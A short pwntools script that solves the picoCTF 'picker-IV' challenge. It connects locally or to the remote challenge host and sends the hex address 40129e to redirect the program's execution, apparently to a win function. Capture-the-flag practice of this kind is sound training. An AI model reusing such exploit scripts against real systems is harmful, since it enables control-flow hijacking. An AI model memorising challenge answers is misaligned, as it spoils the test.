#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("picker-IV")

gs = '''
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    if args.REMOTE:
        return remote("saturn.picoctf.net", 61143)
    else:
        return process(elf.path)

io = start()

io.sendlineafter(b"Enter the address in hex to jump to, excluding '0x': ", b"40129e")

io.interactive()
